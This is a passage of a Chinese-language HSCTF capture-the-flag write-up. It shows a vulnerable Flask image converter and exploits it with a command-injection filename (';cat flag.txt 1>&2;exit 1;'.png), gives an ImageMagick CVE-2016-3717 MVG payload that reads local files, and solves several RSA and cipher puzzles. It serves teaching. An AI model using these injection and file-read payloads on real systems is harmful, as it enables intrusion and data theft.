class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, abort, redirect, render_template, request</span><br><span class="line"><span class="keyword">from</span> flask.helpers <span class="keyword">import</span> url_for</span><br><span class="line"><span class="keyword">from</span> flask.wrappers <span class="keyword">import</span> Response</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">&#x27;/upload&#x27;</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;UPLOAD_FOLDER&quot;</span>] = UPLOAD_FOLDER</span><br><span class="line">app.config[<span class="string">&quot;MAX_CONTENT_LENGTH&quot;</span>] = <span class="number">1</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 1 MB</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rand_name</span>():</span><br><span class="line">	<span class="keyword">return</span> os.urandom(<span class="number">16</span>).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_extension</span>(<span class="params">filename: Path</span>):</span><br><span class="line">	<span class="keyword">return</span> (</span><br><span class="line">		filename.suffix.lower().lstrip(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">		<span class="keyword">in</span> (<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;tiff&quot;</span>, <span class="string">&quot;tif&quot;</span>, <span class="string">&quot;ico&quot;</span>, <span class="string">&quot;bmp&quot;</span>, <span class="string">&quot;ppm&quot;</span>)</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>():</span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>():</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;file&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">		<span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, error=<span class="string">&quot;No file provided&quot;</span>)</span><br><span class="line">	file = request.files[<span class="string">&quot;file&quot;</span>]</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> file.filename:</span><br><span class="line">		<span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, error=<span class="string">&quot;No file provided&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(file.filename) &gt; <span class="number">64</span>:</span><br><span class="line">		<span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, error=<span class="string">&quot;Filename too long&quot;</span>)</span><br><span class="line">	</span><br><span class="line">	filename = Path(UPLOAD_FOLDER).joinpath(<span class="string">&quot;a&quot;</span>).with_name(file.filename)</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> is_valid_extension(filename):</span><br><span class="line">		<span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, error=<span class="string">&quot;Invalid extension&quot;</span>)</span><br><span class="line">	</span><br><span class="line">	file.save(filename)</span><br><span class="line">	</span><br><span class="line">	new_name = filename.with_name(rand_name() + <span class="string">&quot;.png&quot;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		subprocess.run(</span><br><span class="line">			<span class="string">f&quot;convert &#x27;<span class="subst">&#123;filename&#125;</span>&#x27; &#x27;<span class="subst">&#123;new_name&#125;</span>&#x27;&quot;</span>,</span><br><span class="line">			shell=<span class="literal">True</span>,</span><br><span class="line">			check=<span class="literal">True</span>,</span><br><span class="line">			stderr=subprocess.PIPE,</span><br><span class="line">			timeout=<span class="number">5</span>,</span><br><span class="line">			env=&#123;&#125;,</span><br><span class="line">			executable=<span class="string">&quot;/usr/local/bin/shell&quot;</span></span><br><span class="line">		)</span><br><span class="line">	<span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">		<span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, error=<span class="string">&quot;Command timed out&quot;</span>)</span><br><span class="line">	<span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">		<span class="keyword">return</span> render_template(</span><br><span class="line">			<span class="string">&quot;index.html&quot;</span>,</span><br><span class="line">			error=<span class="string">f&quot;Error converting file: <span class="subst">&#123;e.stderr.decode(<span class="string">&#x27;utf-8&#x27;</span>,errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span></span><br><span class="line">		)</span><br><span class="line">	<span class="keyword">finally</span>:</span><br><span class="line">		filename.unlink()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> redirect(url_for(<span class="string">&quot;converted_file&quot;</span>, filename=new_name.name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">converted_file</span>(<span class="params">filename</span>):</span><br><span class="line">	path = Path(UPLOAD_FOLDER).joinpath(<span class="string">&quot;a&quot;</span>).with_name(filename)</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> path.exists():</span><br><span class="line">		<span class="comment"># imagemagick sometimes generates multiple images depending on the src image</span></span><br><span class="line">		oldpath = path</span><br><span class="line">		path = oldpath.with_name(<span class="string">f&quot;<span class="subst">&#123;oldpath.stem&#125;</span>-0<span class="subst">&#123;oldpath.suffix&#125;</span>&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> path.exists():</span><br><span class="line">			<span class="keyword">for</span> i <span class="keyword">in</span> itertools.count(<span class="number">1</span>):</span><br><span class="line">				path2 = oldpath.with_name(<span class="string">f&quot;<span class="subst">&#123;oldpath.stem&#125;</span>-<span class="subst">&#123;i&#125;</span><span class="subst">&#123;oldpath.suffix&#125;</span>&quot;</span>)</span><br><span class="line">				<span class="keyword">if</span> <span class="keyword">not</span> path2.exists():</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				path2.unlink()</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			abort(<span class="number">404</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">generate</span>():</span><br><span class="line">		<span class="keyword">with</span> path.<span class="built_in">open</span>(<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">			<span class="keyword">yield</span> <span class="keyword">from</span> f</span><br><span class="line">		path.unlink()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> Response(generate(), mimetype=<span class="string">&quot;image/png&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">version</span>():</span><br><span class="line">	python_version = sys.version</span><br><span class="line">	flask_version = <span class="built_in">str</span>(flask.__version__)</span><br><span class="line">	magick_version = subprocess.run(</span><br><span class="line">		<span class="string">&quot;convert -version&quot;</span>, shell=<span class="literal">True</span>, check=<span class="literal">False</span>, stdout=subprocess.PIPE</span><br><span class="line">	).stdout.decode()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> render_template(</span><br><span class="line">		<span class="string">&quot;version.html&quot;</span>,</span><br><span class="line">		python_version=python_version,</span><br><span class="line">		flask_version=flask_version,</span><br><span class="line">		magick_version=magick_version</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	app.run()</span><br></pre></td></tr></table></figure>
+<p>阅读源代码，漏洞点应在此处：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">subprocess.run(</span><br><span class="line">			<span class="string">f&quot;convert &#x27;<span class="subst">&#123;filename&#125;</span>&#x27; &#x27;<span class="subst">&#123;new_name&#125;</span>&#x27;&quot;</span>,</span><br><span class="line">			shell=<span class="literal">True</span>,</span><br><span class="line">			check=<span class="literal">True</span>,</span><br><span class="line">			stderr=subprocess.PIPE,</span><br><span class="line">			timeout=<span class="number">5</span>,</span><br><span class="line">			env=&#123;&#125;,</span><br><span class="line">			executable=<span class="string">&quot;/usr/local/bin/shell&quot;</span></span><br><span class="line">		)</span><br></pre></td></tr></table></figure>
+<p>关键的一个点是Shell=True，这意味着我们的命令将会通过shell来执行，而执行的命令中有我们可控的参数，所以想法就是能不能进行命令注入。又看了一遍源代码，直接闭合引号，再利用分号分隔命令即可。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&quot;http://192.168.226.128:6003&quot;</span></span><br><span class="line">resp = requests.post(url,files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&quot;&#x27;;cat flag.txt 1&gt;&amp;2;exit 1;&#x27;.png&quot;</span>,<span class="string">&quot;&quot;</span>)&#125;)</span><br><span class="line"><span class="built_in">print</span>(re.search(<span class="string">r&quot;flag&#123;.*?&#125;&quot;</span>, resp.text).group(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
+<p>本地看一下最后传入的filename大概是什么样子的</p>
+<p><img src="https://i.imgur.com/ODtPmX2.png" alt></p>
+<p>然后执行<strong>convert ‘/upload/‘;cat flag.txt 1&gt;&2;exit 1;’.png’ ‘{new_name}’</strong></p>
+<p>convert的参数是/upload/，同时将flag.txt的内容重定向到标准输出及标准错误输出，之后执行exit关闭shell，后面的命令就完全没有执行了。这里有一个很细节的点就是一定要让shell中单引号成功匹配，否则exit无法执行并退出。这也是为什么payload中明明已经exit了却还要加单引号去闭合。</p>
+<p>可以在本地测试一下</p>
+<p><img src="https://i.imgur.com/3ZpgMXn.png" alt></p>
+<p>上图单引号不匹配，没有成功执行命令。而下图回车之后成功退出shell并执行了命令。</p>
+<p><img src="https://i.imgur.com/Jqgr9f4.png" alt></p>
+<p>同时为了让bahs报错，显式地输入exit 1，否则bash正常退出啦我们就不能在报错信息里看到flag。</p>
+<p><img src="https://i.imgur.com/e9uJByU.png" alt></p>
+<h3 id="png-wizard-v2-cve-2016-3717-du-qu-ren-yi-ben-di-wen-jian"><a href="#png-wizard-v2-cve-2016-3717-读取任意本地文件" class="headerlink" title="png-wizard-v2-cve-2016-3717-读取任意本地文件"></a>png-wizard-v2-cve-2016-3717-读取任意本地文件<a href="#png-wizard-v2-cve-2016-3717-du-qu-ren-yi-ben-di-wen-jian" class="header-anchor">#</a></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#URL = &quot;http://localhost:8005&quot;</span></span><br><span class="line">URL = <span class="string">&quot;http://web1.hsctf.com:8005&quot;</span></span><br><span class="line">resp = requests.post(URL, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;solve.png&quot;</span>, <span class="built_in">open</span>(<span class="string">&quot;solve.png&quot;</span>))&#125;)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;out.png&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(resp.content)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox <span class="number">0</span> <span class="number">0</span> <span class="number">640</span> <span class="number">480</span></span><br><span class="line">image over <span class="number">0</span>,<span class="number">0</span> <span class="number">0</span>,<span class="number">0</span> <span class="string">&#x27;label:@/app/flag.txt&#x27;</span></span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a></p>
+<p>复现本题的时候docker镜像出了很多问题，弄了一下午一晚上…..</p>
+<p>最后是将有问题的步骤先从dockerfile里面删除，最后成功建立镜像。随后运行对应的容器，在容器里面继续安装这个有问题的步骤，最后就弄好了！</p>
+<p>然后运行我们上面的py3脚本，然后就可以打开out.png查看flag。</p>
+<p><img src="/images/image-20220926213057108.png" alt="flag"></p>
+<h2 id="crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto<a href="#crypto" class="header-anchor">#</a></h2><h2 id="baby-baby-rsa"><a href="#baby-baby-rsa" class="headerlink" title="baby-baby-rsa"></a>baby-baby-rsa<a href="#baby-baby-rsa" class="header-anchor">#</a></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">pt = bytes_to_long(flag)</span><br><span class="line">bits = <span class="number">768</span></span><br><span class="line">p,q = getPrime(bits),getPrime(bits)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(pt,e,n))</span><br><span class="line">bit_p = <span class="built_in">bin</span>(p)[<span class="number">2</span>:]</span><br><span class="line">bit_q = <span class="built_in">bin</span>(q)[<span class="number">2</span>:]</span><br><span class="line">parts = [bit_p[<span class="number">0</span>:bits//<span class="number">3</span>],bit_p[bits//<span class="number">3</span>:<span class="number">2</span>*bits//<span class="number">3</span>],bit_p[<span class="number">2</span>*bits//<span class="number">3</span>:bits],bit_q[<span class="number">0</span>:bits//<span class="number">3</span>],bit_q[bits//<span class="number">3</span>:<span class="number">2</span>*bits//<span class="number">3</span>],bit_q[<span class="number">2</span>*bits//<span class="number">3</span>:bits]]</span><br><span class="line">random.shuffle(parts)</span><br><span class="line"><span class="built_in">print</span>(parts)</span><br></pre></td></tr></table></figure>
+<p>题目很简单，将p、q各自的二进制比特位分成三半随后打乱顺序。从组合上看这就是一个3个元素的全排列，利用itertools模块可以轻松枚举所有的p、q的二进制比特位的排列顺序。</p>
+<h2 id="baby-rsa"><a href="#baby-rsa" class="headerlink" title="baby-rsa"></a>baby-rsa<a href="#baby-rsa" class="header-anchor">#</a></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">pt = bytes_to_long(flag)</span><br><span class="line">p,q = getPrime(<span class="number">512</span>),getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">a = random.randint(<span class="number">0</span>,<span class="number">2</span>**<span class="number">512</span>)</span><br><span class="line">b = random.randint(<span class="number">0</span>,a)</span><br><span class="line">c = random.randint(<span class="number">0</span>,b)</span><br><span class="line">d = random.randint(<span class="number">0</span>,c)</span><br><span class="line">e = random.randint(<span class="number">0</span>,d)</span><br><span class="line">f = <span class="number">0x10001</span></span><br><span class="line">g = [[-a,<span class="number">0</span>,a],[-b,<span class="number">0</span>,b],[-c,<span class="number">0</span>,c],[-d,<span class="number">0</span>,d],[-e,<span class="number">0</span>,e]]</span><br><span class="line">h = <span class="built_in">list</span>(<span class="built_in">pow</span>(<span class="built_in">sum</span>(_),p,n) <span class="keyword">for</span> _ <span class="keyword">in</span> itertools.product(*g))</span><br><span class="line">random.shuffle(h)</span><br><span class="line"><span class="built_in">print</span>(h[<span class="number">0</span>:<span class="built_in">len</span>(h)//<span class="number">2</span>])</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(pt,f,n))</span><br></pre></td></tr></table></figure>
+<p>给出五个数a、b、c、d、e，然后以这五个数为基础，构成五个具有三个元素的集合。随后再对这五个集合作笛卡尔积，随后对作完笛卡尔积后得到的新集合中的每个元素$(x_1,x_2,x_3,x_4,x_5)$ 求和$x_1+x_2+x_3+x_4+x_5$，以下简称元素的元组和。然后将和的结果进行RSA的加密运算，最后再把加密运算的结果打乱顺序告诉我们。不妨设笛卡尔积集合的某两个元素的元组和是$a,b$</p>
+<p>那么根据题目我们有：</p>
+<p>$a^p\equiv c_1 \mod n$d</p>
+<p>$b^p\equiv c_2 \mod n$</p>
+<p>根据题目的这个笛卡尔积集合的性质（观察三个元素的集合发现他们中间都有一个0），肯定存在一个元素其元组和是$a+b$，所以我们还有$(a+b)^p\equiv a^p + b^p + pX \equiv c_3 \mod n$（二项式定理）。</p>
+<p>那么这样就意味着 $(a+b)^p-a^p-b^p \equiv pX \equiv c_4 \mod n$，这就表明$c_4 \equiv 0 \mod p$</p>
+<p>这就是说c4跟n的公因数应该就是p，我们多求几对这样的c4就行。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="string">&#x27;C:\\Users\\mirror\\Desktop\\write-up\\HSCTF\\baby-rsa\\output.txt&#x27;</span></span><br><span class="line">f = <span class="built_in">open</span>(f,<span class="string">&quot;r&quot;</span>).read().replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">num = [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> f]</span><br><span class="line"><span class="comment">#读取文件的时候单独复制n、ct，前面的处理没有读取到n、ct</span></span><br><span class="line">n = <span class="number">56319147982834690746853975316533145246719591165140897651231743096062383519002458932957678989024047296656519848627187749982108523549779413353513306122693067943651102381477504493441939832397586127041682373479064038277904254982764075640287544726364344375278504825481109624802050105563861419436423622873812827337</span></span><br><span class="line">ct = <span class="number">22560630408234666984622660623345600406581810801462944442925416534874150827364809064794374954441858113882177788546174341584373911768728976592365286999292769259538811140546781640416859788199247941294855485036387064352138049560948015416721112570424424100973923502360042557894202576799349475920730125529804597978</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.combinations(num,<span class="number">3</span>):</span><br><span class="line">    tmp = (i[<span class="number">0</span>]-i[<span class="number">1</span>]-i[<span class="number">2</span>])</span><br><span class="line">    tmp1 = GCD(tmp,n)</span><br><span class="line">    <span class="keyword">if</span>(tmp1!=<span class="number">1</span>):</span><br><span class="line">        p = tmp1</span><br><span class="line">        q = n//p</span><br><span class="line">        <span class="keyword">assert</span> p*q==n</span><br><span class="line">        phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">        d = inverse(e,phi)</span><br><span class="line">        m = <span class="built_in">pow</span>(ct,d,n)</span><br><span class="line">        m =(long_to_bytes(m))</span><br><span class="line">        <span class="keyword">if</span>(m.startswith(<span class="string">b&#x27;flag&#x27;</span>)):</span><br><span class="line">            <span class="built_in">print</span>(m)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="bucephala-albeola-the-second"><a href="#bucephala-albeola-the-second" class="headerlink" title="bucephala-albeola-the-second"></a>bucephala-albeola-the-second<a href="#bucephala-albeola-the-second" class="header-anchor">#</a></h2><h2 id="homophones"><a href="#homophones" class="headerlink" title="homophones"></a>homophones<a href="#homophones" class="header-anchor">#</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SDFBE1X38 ILNVP 6RTC HXYUKLM 82ZH NVL JBE4CG 9A D5HE</span><br><span class="line">7WJZH5. QZAC U2GI T6 0F! ORWH5 97 T1AXYZ6FUE L2 VT8</span><br><span class="line">8XZ VKUY 15 T1UF CN JHTJI 6R9P JK4R5B.</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">plaintext = <span class="built_in">input</span>().strip()</span><br><span class="line">cleanedText = <span class="string">&quot;&quot;</span>.join(<span class="built_in">filter</span>(<span class="built_in">str</span>.isalpha,plaintext.lower()))</span><br><span class="line">result = hashlib.md5(cleanedText.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"><span class="keyword">assert</span> result.digest().<span class="built_in">hex</span>()[:<span class="number">6</span>]==<span class="string">&quot;1c9ea7&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag&#123;&#123;&#123;&#125;&#125;&#125;&quot;</span>.<span class="built_in">format</span>(result.digest().<span class="built_in">hex</span>()))</span><br></pre></td></tr></table></figure>
+<p>题目给了一段替换密码的密文，然后flag是对应的明文经过md5函数之后的十六进制编码。题目提示说明文是一段语法正确的英文，我没搞出来。。。</p>
+<p>密码体制的说明：<a target="_blank" rel="noopener" href="http://practicalcryptography.com/ciphers/homophonic-substitution-cipher/">Practical Cryptography</a></p>
+<p>最后是在网络上找到的答案</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Everybody knows that rolling your own crypto is very</span><br><span class="line">secure. Just look at me! There is absolutely no way</span><br><span class="line">you will be able to crack this cipher.</span><br><span class="line">#flag&#123;1c9ea7b792ebb677aeefe01d4a862b47&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="otp"><a href="#otp" class="headerlink" title="otp"></a>otp<a href="#otp" class="header-anchor">#</a></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secure_seed</span>():</span><br><span class="line">	x = <span class="number">0</span></span><br><span class="line">	<span class="comment"># x is a random integer between 0 and 100000000000</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000000000</span>):</span><br><span class="line">		x += random.randint(<span class="number">0</span>, random.randint(<span class="number">0</span>, <span class="number">10</span>))</span><br><span class="line">	<span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">random.seed(secure_seed())</span><br><span class="line"></span><br><span class="line">l = <span class="built_in">len</span>(<span class="built_in">bin</span>(flag)) - <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(l)</span><br><span class="line"></span><br><span class="line">k = random.getrandbits(l)</span><br><span class="line">flag = flag ^ k <span class="comment"># super secure encryption</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+<p>一个新奇的知识点是在本题当中<code>random_seed()</code>函数的返回值会在统计学上收敛于某个值，而且这个值应当不会太大，但背后的缘由我却无从知晓。但是求出收敛值的过程在网路上我没有找到答案，最后发现有这么一句话 <code>otp random(0,1) just averages to 0.5 on the long run</code>。这句话的意思应该是如果频繁调用 random.randint(0,1)求和，那么从长远来看相当于每次都加上了0.5。</p>
+<p>本题当中一共求了N=10000000000次和，观察一下其实会发现应该相当于每次加了2.5。所以收敛值应该是2.5*N。我们在这个收敛值的附近爆破种子即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c=<span class="number">444466166004822947723119817789495250410386698442581656332222628158680136313528100177866881816893557</span></span><br><span class="line">N = <span class="number">10000000000</span></span><br><span class="line">N1 = <span class="built_in">int</span>(N * <span class="number">2.5</span>)</span><br><span class="line"><span class="built_in">print</span>(N1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">1000000</span>,<span class="number">1000000</span>):</span><br><span class="line">    random.seed(i+N1)</span><br><span class="line">    l = random.getrandbits(<span class="number">328</span>)</span><br><span class="line">    m = long_to_bytes(c ^ l)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;flag&quot;</span> <span class="keyword">in</span> m:</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
